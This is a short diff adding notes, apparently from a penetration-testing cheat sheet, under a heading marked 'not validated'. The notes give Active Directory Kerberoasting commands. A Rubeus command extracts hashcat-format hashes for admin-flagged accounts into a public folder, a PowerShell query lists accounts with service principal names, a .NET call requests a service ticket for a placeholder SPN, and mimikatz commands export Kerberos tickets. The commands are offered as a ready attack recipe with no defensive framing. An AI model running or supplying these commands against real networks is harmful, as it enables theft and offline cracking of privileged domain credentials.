@@ -8,3 +8,19 @@
 5. `rubeus.exe`
 
 
+
+---------------not validated------------------------
+
+Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Users\Public\hashes.txt
+
+
+
+
+
+"get-aduser -filter * -properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""VULN SPN GOES HERE"""
+"mimikatz
+privilege::debug
+kerberos::list /export"
